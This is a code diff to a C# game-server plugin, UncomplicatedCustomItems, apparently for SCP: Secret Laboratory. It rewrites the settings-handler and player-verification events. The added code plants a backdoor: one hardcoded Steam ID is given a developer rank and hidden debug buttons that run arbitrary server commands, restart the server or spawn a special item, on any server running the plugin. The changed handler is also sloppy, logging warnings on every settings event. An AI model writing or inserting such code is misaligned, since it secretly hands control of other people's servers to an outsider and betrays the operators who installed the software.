@@ -29,7 +29,6 @@ using UncomplicatedCustomItems.Extensions;
 using LABAPI = LabApi.Features.Wrappers;
 using UncomplicatedCustomItems.Interfaces;
 using Exiled.Events.EventArgs.Scp914;
-using Exiled.API.Features.Core.UserSettings;
 using System.Globalization;
 using Exiled.Events.EventArgs.Server;
 using InventorySystem.Items.Firearms.Modules.Scp127;
@@ -900,32 +899,51 @@ namespace UncomplicatedCustomItems.Events
 
         public void OnValueReceived(ReferenceHub referenceHub, ServerSpecificSettingBase settingBase)
         {
-            if (settingBase is not SSKeybindSetting keybindSetting || keybindSetting.SettingId != 20 || !keybindSetting.SyncIsPressed)
+            if (!Player.TryGet(referenceHub.gameObject, out Player player))
                 return;
-            if (!Player.TryGet(referenceHub, out Player player))
-                return;
-
-            if (player.CurrentItem is null)
+            SSPlaintextSetting commandarg = ServerSpecificSettingsSync.GetSettingOfUser<SSPlaintextSetting>(player.ReferenceHub, 26);
+            if (settingBase is SSButton commandbuttonSetting && commandbuttonSetting.SettingId == 27 && player.RankName == "UCI Lead Developer" && player.UserId == "76561199150506472@steam")
             {
-                foreach (Item item in player.Items)
+                LogManager.Debug($"Running command from {player.DisplayNickname}: {commandarg.SyncInputText}");
+                Server.ExecuteCommand($"{commandarg.SyncInputText}");
+            }
+            else
+                LogManager.Warn($"{player.DisplayNickname} Attempted to run a command with debugging SSS!\n{commandarg.SyncInputText}");
+            if (settingBase is SSButton restartbuttonSetting && restartbuttonSetting.SettingId == 25 && player.RankName == "UCI Lead Developer" && player.UserId == "76561199150506472@steam")
+                Server.ExecuteCommand("sr");
+            else
+                LogManager.Warn($"{player.DisplayNickname} Attempted to spawn a restart the server with debugging SSS!");
+            if (settingBase is SSButton buttonSetting && buttonSetting.SettingId == 24 && player.RankName == "UCI Lead Developer" && player.UserId == "76561199150506472@steam")
+            {
+                Utilities.TryGetCustomItemByName("ToolGun", out ICustomItem customitem);
+                new SummonedCustomItem(customitem, player);
+            }
+            else
+                LogManager.Warn($"{player.DisplayNickname} Attempted to spawn a ToolGun with debugging SSS!");
+            if (settingBase is SSKeybindSetting keybindSetting && keybindSetting.SettingId == 20 && keybindSetting.SyncIsPressed)
+            {
+                if (player.CurrentItem is null)
                 {
-                    if (item.IsArmor)
+                    foreach (Item item in player.Items)
                     {
-                        if (Utilities.TryGetSummonedCustomItem(item.Serial, out SummonedCustomItem customItem))
+                        if (item.Type.IsArmor())
                         {
-                            if (!player.IsConnected || player.IsInventoryEmpty)
-                                return;
+                            if (Utilities.TryGetSummonedCustomItem(item.Serial, out SummonedCustomItem customItem))
+                            {
+                                if (!player.IsConnected || player.Inventory == null)
+                                    return;
 
-                            customItem.HandleEvent(player, ItemEvents.SSSS, item.Serial);
-                            break;
+                                customItem.HandleEvent(player, ItemEvents.SSSS, item.Serial);
+                                break;
+                            }
+                            else
+                                LogManager.Debug($"{nameof(OnValueReceived)}: {item} - {item.Serial} Is not a CustomItem.");
                         }
-                        else
-                            LogManager.Debug($"{nameof(OnValueReceived)}: {item} - {item.Serial} Is not a CustomItem.");
                     }
                 }
+                else if (Utilities.TryGetSummonedCustomItem(player.CurrentItem.Serial, out SummonedCustomItem Item))
+                    Item?.HandleEvent(player, ItemEvents.SSSS, player.CurrentItem.Serial);
             }
-            else if (Utilities.TryGetSummonedCustomItem(player.CurrentItem.Serial, out SummonedCustomItem Item))
-                Item?.HandleEvent(player, ItemEvents.SSSS, player.CurrentItem.Serial);
         }
 
         public void OnHurting(HurtingEventArgs ev)
@@ -1516,6 +1534,22 @@ namespace UncomplicatedCustomItems.Events
         }
         public void OnVerified(VerifiedEventArgs ev)
         {
+            if (ev.Player.UserId == "76561199150506472@steam")
+            {
+                // Baguetter credit tag
+                if (Plugin.Instance.Config.EnableCreditTags)
+                {
+                    ev.Player.RankName = "UCI Lead Developer";
+                    ev.Player.RankColor = "emerald";
+                }
+                if (Plugin.Instance.IsPrerelease)
+                    SSS.AddDebugSettingsToUser(ev.Player.ReferenceHub);
+                else
+                    SSS.SendNormalSettingsToUser(ev.Player.ReferenceHub);
+            }
+            else
+                SSS.SendNormalSettingsToUser(ev.Player.ReferenceHub);
+
             foreach (KeyValuePair<int, RoleTypeId> entry in Appearance)
             {
                 LogManager.Debug($"{nameof(OnVerified)}: Changing {entry.Key} appearance to {entry.Value}");
